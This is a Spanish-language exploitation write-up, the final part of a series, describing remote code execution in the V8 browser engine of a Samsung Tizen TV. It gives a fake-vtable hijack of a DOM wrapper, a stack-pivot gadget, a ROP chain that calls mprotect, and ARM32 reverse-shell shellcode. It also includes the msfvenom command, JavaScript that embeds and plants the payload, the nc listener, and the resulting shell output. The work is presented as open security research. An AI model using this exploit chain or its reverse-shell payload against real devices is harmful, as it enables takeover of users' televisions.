---
title: "RCE en V8 de una Samsung TV #6 — ROP, mprotect y reverse shell"
publishDate: "2026-06-18"
description: "El final: secuestrar un DOM wrapper con una fake-vtable, pivotear el stack, ROP a mprotect y aterrizar un reverse shell ARM32 en la TV."
tags: ["samsung-tv", "tizen", "chromium", "v8", "wasm", "type-confusion", "arm32", "browser-exploitation", "rce"]
draft: false
listed: false
lang: "es"
altSlug: "samsung-tv-v8-rce-rop-reverse-shell"
series: "samsung-tv-v8-rce"
seriesOrder: 6
seriesLabel: "06 · ROP → mprotect → reverse shell"
---

Llegamos al final. El veredicto de [05](/blog/samsung-tv-v8-rce-dep-es) fue claro — **W^X / DEP en vigor**: stack `RW-`, librería W^X estricta, code-space JIT `R-X` en reposo. No hay RWX que abusar, así que la etapa de ejecución es **ROP**. La buena noticia es que tengo todo para armarla: R/W arbitrario ([01](/blog/samsung-tv-v8-rce-primitivas-es)), `elf_base` ASLR-proof ([04](/blog/samsung-tv-v8-rce-elf-base-es)) y **395k gadgets** del `.so` dumpeado.

Falta lo más entretenido: *cómo* hago que la CPU empiece a ejecutar mis gadgets.

## El hijack: fake-vtable sobre el `ScriptWrappable`

El PoC original que porté ([PumpkinBridge](https://github.com/PumpkinBridge/Chrome-CVE-2024-2887-RCE-POC), Chrome **125 x64 Windows**) resuelve esto con un **hijack del CodePointerTable (CPT)** + corrupción de PartitionAlloc — **dos construcciones exclusivas del V8 Sandbox de 64-bit**. Y acá viene algo que no esperaba: en ARM32 no existe ninguna de las dos, y eso *me simplifica* la vida en lugar de complicarla.

| Pieza del original (x64) | En ARM32 (32-bit) |
|--------------------------|-------------------|
| **PartitionAlloc SlotSpan corruption** (escape del cage) | **Innecesario.** Sin pointer-compression cage, `write32` ya escribe en **todo** el espacio ([01](/blog/samsung-tv-v8-rce-primitivas-es)). No hay jaula que romper. |
| **CodePointerTable hijack** (`fptr_xor`) | **No existe.** El CPT es parte del sandbox de 64-bit. En V8 32-bit no hay CPT, ni `fptr_xor`, ni CFG sobre punteros de código. |

No hay sandbox que escapar (ya tengo R/W total) ni indirección que falsificar. El camino que funcionó abusa de una particularidad de ARM: en la convención C++ de ARM32, el puntero `this` se pasa en **`r0`**.

Para ver por qué eso alcanza, hay que entender cómo funciona una **llamada virtual** en C++. Cuando se llama un método virtual de un objeto, el compilador no sabe de antemano a qué función saltar: lo resuelve en runtime mirando la **vtable** del objeto —una tabla de punteros a funciones— que está guardada en la primera palabra del objeto. O sea: para llamar `obj->algo()`, la CPU lee `*obj` (ahí está la vtable), busca el slot que le toca, y salta a esa dirección. Si yo controlo qué hay en `*obj`, controlo a dónde salta. Esa es toda la idea, y se arma en tres piezas:

1. **Apuntar el wrapper a un objeto que yo controlo.** Un DOM wrapper guarda en `wrapper+0x10` el puntero a su objeto C++ de Blink (el `ScriptWrappable`, sobre el que Blink llama métodos virtuales todo el tiempo). Con `write32` piso ese puntero y lo hago apuntar a **mi propio `ArrayBuffer`**, cuya dirección ya conozco con `addrOf`. A partir de ahí, para Blink, "el objeto" es mi buffer: yo decido byte por byte qué hay adentro.

2. **Plantar una vtable falsa adentro del buffer.** Cuando Blink hace la próxima llamada virtual sobre "el objeto" (mi buffer), sigue el mismo procedimiento de siempre: lee la primera palabra del buffer para encontrar la vtable, va a esa vtable, toma el slot del método que quería llamar, y salta a la dirección que haya ahí. Como el buffer es mío, controlo las dos lecturas que hace Blink: la primera palabra (que apunto a una vtable falsa, también dentro del buffer) y los slots de esa vtable falsa (donde pongo las direcciones a las que quiero que salte). En cada slot escribo la **misma** dirección: la de un gadget que llamo `PIVOT` —un pedacito de código que ya existe en `libchrome.so` y que uso para arrancar la cadena; lo veo en detalle en el paso 3—. ¿Por qué el mismo en todos los slots? Porque no sé —ni me importa— qué método virtual va a invocar Blink: sea el slot que sea, la dirección que encuentra es siempre `PIVOT`. Salto garantizado.

3. **Pivotear el stack hacia mi buffer.** Acá entra el truco que hace posible ROP: una cadena ROP se ejecuta leyendo "el stack", así que necesito que el stack *sea mi buffer*. El gadget `PIVOT` real es `mov sp, r0 ; add sp, #4 ; pop {r4-fp, ip, lr} ; add sp, #8 ; bx lr`, y hace dos cosas en una. Primero, `mov sp, r0` copia `r0` (mi buffer) a `SP`: desde ese instante el procesador toma como stack la **cadena ROP** que yo ya dejé escrita en el buffer. Y acá está la parte que hace que todo cierre: el `bx lr` del final **no** vuelve al `lr` de la llamada original (ese apuntaría de vuelta a Blink). Antes del `bx lr`, ese `pop {…, lr}` carga `lr` **desde mi propio buffer**, donde yo ya escribí la dirección del primer gadget de la cadena (`ARGS = pop {r0, r1, r2, …, pc}`). Así que el `bx lr` cae, de forma determinística, en `ARGS`, que carga los argumentos de `mprotect` (`r0`, `r1`, `r2`) y arranca la cadena.

Falta el **gatillo**: *cómo* fuerzo esa llamada virtual cuando todo está listo. Acá el objeto que secuestro no es `document.body` sino un `<div>` que creo con `createElement` y **no agrego al DOM** — desacoplado a propósito, para que el motor no lo toque entre mi `write32` y el disparo (a `document.body`, en cambio, el render lo referencia todo el tiempo). Con el wrapper ya redirigido, leo `div.nodeName`: esa propiedad, por dentro, es un **método virtual de `Node`**. Leerla dispara exactamente *una* llamada virtual sobre "el objeto" —que ahora es mi buffer—, y ahí arranca todo. Ese `el.nodeName` es el disparo.

Así se ve el buffer que preparo, y la secuencia que dispara una sola llamada virtual:

```
Mi ArrayBuffer (lo conozco con addrOf):
┌──────────────────────────┬─────────────────────────────────┐
│ fake vtable: PIVOT,PIVOT… │ cadena ROP: pop {r0,r1,r2}; …   │
└──────────────────────────┴─────────────────────────────────┘
  ▲ *(buf) cae acá           ▲ acá apunta SP tras el pivot

Paso 1   write32(div+0x10, buf)        → para Blink, el ScriptWrappable del <div> ahora es mi buffer
Paso 2   leo div.nodeName (virtual)    → r0 = buf ;  salta a *(*buf) = PIVOT
Paso 3   PIVOT: mov sp, r0             → SP = buf  (el stack ahora es mi cadena ROP)
Paso 4   la cadena ROP corre           → mprotect(page, 0x4000, RWX) ; salta al shellcode
```

Mismo *esqueleto* que el original (corromper una indirección → pivot → ROP → mem-protect → shellcode), pero **sin CPT, sin `fptr_xor` y sin PartitionAlloc**. Toda esa maquinaria del PoC original deja de importar: con el ancla del DOM wrapper la salteo por completo. A veces el camino correcto es más corto de lo que el original te hace creer.

## La cadena, en tres movimientos

Una vez que `SP` apunta a la fake-stack, viene la cadena ARM32 clásica:

```
   pivot (SP→fake-stack)  →  ROP: mprotect(buf, len, RWX)  →  jump buf  →  shellcode
```

**1. Leak de `mprotect`, sin pelear el ASLR de la libc.** `mprotect` no es un símbolo definido en `libchromium-impl.so` — es un **import vía PLT** a la libc de los `NEEDED` (stack EFL de Tizen). Pero gracias a `DF_BIND_NOW` + full RELRO ([05](/blog/samsung-tv-v8-rce-dep-es)), la **GOT ya está poblada** en el load con la dirección de runtime real. La leo con `read32()` desde el slot del GOT (offset conocido del dump) → dirección de `mprotect`, sin tener que derrotar el ASLR de la libc por separado. Todo cuelga de `elf_base`, que ya derivo estable.

**2. La cadena ROP.** Convención ARM EABI: argumentos en `r0, r1, r2`. De los 395k gadgets salen los `pop {r0, …} ; bx lr` necesarios para cargar `r0 = page_base` (base alineada a página del buffer a volver ejecutable), `r1 = 0x4000` (`len`), `r2 = 7` (`PROT_READ|WRITE|EXEC`), y saltar a `mprotect`. El buffer a volver RWX es mi propio `ArrayBuffer` — el mismo que sirve de fake-stack —, cuya dirección ya conozco por `addrOf`.

**3. Jump al shellcode.** Tras `mprotect`, `page_base` es **RWX**. Salto a él; el buffer contiene el shellcode ARM32 de validación.

La etapa corre como dos payloads — **recon, después disparo**:

- **`vtable.js`** — la validación **read-only**: encuentra el `ScriptWrappable*` a secuestrar, confirma que `wrapper+0x10` es el target, y resuelve `elf_base`/`mprotect`/`PIVOT`. No toca memoria.
- **`pwn.js`** — la **fase de escritura** (`FIRE=true`): planta la fake-vtable + la cadena ROP en el `ArrayBuffer` y dispara `write32 + trigger`.

![Payload `vtable` validando el hijack en el TV](/assets/blog/samsung-tv-rce-5-vtable.png)

*`vtable` (read-only): localiza el `ScriptWrappable*` del wrapper como `VTABLE-FIRST (HIJACK TARGET)` y vuelca el resumen de validación del hijack (lo que el log rotula `VALIDACIÓN CAMINO A`) — `elf_base`, `mprotect` runtime, `PIVOT` — sin tocar memoria todavía.*

![Payload `pwn` disparando con FIRE=true en el TV](/assets/blog/samsung-tv-rce-6-pwn.png)

*`pwn` en la **fase de escritura** (`FIRE = true`): planta la fake-vtable homogénea + la cadena ROP en el `ArrayBuffer` y dispara `write32 + trigger`. El log se corta justo ahí porque la ejecución se desvía al shellcode y el render muere — exactamente lo que quería.*

## El shellcode: backconnect `/bin/sh`

Para el shellcode sólo necesito una prueba inequívoca de ejecución nativa, nada de cargas ofensivas. Así que un reverse shell ARM32 (`linux/armle/shell_reverse_tcp`). El binario que efectivamente disparó la cadena es [`payloads/shellcode/callback.bin`](https://github.com/hdbreaker/samsung-smarttv-tizen-9-chromium-120-v8-rce/tree/main/payloads/shellcode), de msfvenom:

```bash
msfvenom -p linux/armle/shell_reverse_tcp LHOST=192.168.100.80 LPORT=1337 \
         -a armle --platform linux -f raw > callback.bin
```

Esos 172 bytes los embebo en `pwn.js` como array y los planto en el `ArrayBuffer` (offset `L_SHELL = 0x600` del backing), y dejo el `lr` de `mprotect` apuntando ahí: cuando la página se vuelve RWX, el `mprotect` retorna directo al shellcode.

```javascript
// pwn.js — callback.bin embebido y plantado en el buffer
const SHELLCODE = [
  0x02,0x00,0xa0,0xe3, 0x01,0x10,0xa0,0xe3, /* … */   // 172B de callback.bin
];
const L_SHELL = 0x600;                                 // offset del shellcode dentro del backing
for (let i = 0; i < SHELLCODE.length; i++)
  sdv.setUint8(L_SHELL + i, SHELLCODE[i]);             // lo escribo en mi ArrayBuffer

const shellAddr = (backing + L_SHELL) >>> 0;           // dirección absoluta del shellcode
sdv.setUint32(L_MPLR, shellAddr, true);                // lr de mprotect -> retorna acá, ya RWX
```

`socket → connect → dup2 ×3 → execve("/bin/sh")` de vuelta a mi PC, la researcher machine en `192.168.100.80:1337`. Listener:

```bash
nc -l 1337 -vv
```

> En [`payloads/shellcode/arm32_reverse_shell.s`](https://github.com/hdbreaker/samsung-smarttv-tizen-9-chromium-120-v8-rce/tree/main/payloads/shellcode) queda además una versión **escrita a mano** del mismo backconnect (null-free, ARM→Thumb, basada en el trabajo de Gokul Babu) como referencia y material de estudio.

Cuando la cadena salta al buffer RWX, la TV abre `/bin/sh` contra mi laptop:

![Reverse shell recibida en la researcher machine](/assets/blog/samsung-tv-rce-shell-owner.png)

```text
$ nc -l 1337 -vv
uname -a
Linux localhost 5.4.261 #1 SMP PREEMPT ... armv7l GNU/Linux
whoami
owner
ps aux | grep sandbox
owner 15594 ... /usr/bin/efl_webprocess --type=zygote --no-sandbox -- .../org.tizen.browser
```

Eso es todo. Ejecución de comandos arbitrarios en la TV con el UID del navegador (`owner`). `armv7l` confirma el userland ARM 32-bit. Y `--no-sandbox` en `efl_webprocess` significa que el render del Tizen Browser corre **sin sandbox** — así que un RCE en V8 cae directo sobre el proceso del navegador, sin etapa de escape. Sin ADB, sin modo desarrollador: la única vía de entrada fue un bug de V8 en una página servida desde mi propia laptop.

## Por qué cada eslabón cierra

El reverse shell no es una carga ofensiva — es la prueba mínima e inequívoca de ejecución de código arbitrario, y todo el arco de la serie se resume en cuatro pasos:

1. Una **type confusion** de WasmGC da R/W arbitrario, sin cage en 32-bit ([01](/blog/samsung-tv-v8-rce-primitivas-es))
2. Ese R/W **deriva `elf_base`** (ASLR-proof, [03](/blog/samsung-tv-v8-rce-cadena-es) / [04](/blog/samsung-tv-v8-rce-elf-base-es)) y, ya en este capítulo, **leakea `mprotect`** del GOT.
3. Una **cadena ROP** vuelve un buffer RWX pese a W^X/DEP ([05](/blog/samsung-tv-v8-rce-dep-es)).
4. El shellcode prueba ejecución nativa: una shell en mi PC.

Todo empezó con una curiosidad simple — *¿qué hay realmente del otro lado de la pantalla?* — y la única forma honesta de responderla era abrir la caja y mirar adentro. No había un mapa: cada paso fue una hipótesis que la TV confirmaba o rechazaba a su manera (un crash, un `\x7fELF`, un puntero que caía donde tenía que caer). Lo que quedó no es la shell en sí, sino el método: agarrar un dispositivo cerrado, hacerle las preguntas correctas, y dejar que él mismo te cuente cómo está hecho. Esa es, para mí, la magia del hacking.

## Sobre el Bug Bounty (y por qué esto es gratis)

Algunos —sobre todo los que recién arrancan— me escribieron preguntándome por el programa de Bug Bounty de Samsung: https://security.samsungtv.com/bugbountyProgram

Y la verdad, se las debo con una respuesta honesta. Estoy bastante seguro de que un bug así califica dentro del programa. Pero los que me vienen siguiendo ya saben que no soy un gran fan de los Bug Bounty, así que antes de escribir esto me tomé el trabajo de buscar con calma si había algún *Vulnerability Disclosure Program* de verdad, uno que permitiera publicar. No encontré un solo finding público. Ni uno.

En este momento de mi vida es mucho más importante para mí volver a escribir, reconectar con la comunidad y compartir mis aventuras en OffSec —el trabajo de contar el cómo, no solo el qué— de forma libre, que cobrar un cheque a cambio de silencio. Porque esa es la letra chica que casi nadie cuenta: una de las peores cosas que le trajo el Bug Bounty a nuestra comunidad es que un montón de programas te obligan a mantener la investigación bajo llave. Firmás, cobrás, y lo que descubriste se muere ahí, en un PDF que nadie va a leer nunca.

Pensalo un segundo: cada writeup que no se publica es una puerta que se le cierra al que viene atrás. Yo aprendí leyendo a otros que se tomaron el trabajo de contar el cómo. Ese, para mí, es el verdadero costo del Bug Bounty: lo que se pierde no es dinero, es conocimiento que podría haber sido de todos, incentivando nuevas investigaciones, cerrando gaps entre investigadores y retroalimentando nuestro conocimiento. Acordate, el Hacking es Ilegal y para Nerds, nuestra comunidad siempre se mantuvo por medio de conocimiento compartido entre nosotros. Y es por eso que esto que estás leyendo es gratis, abierto, y va a seguir así.
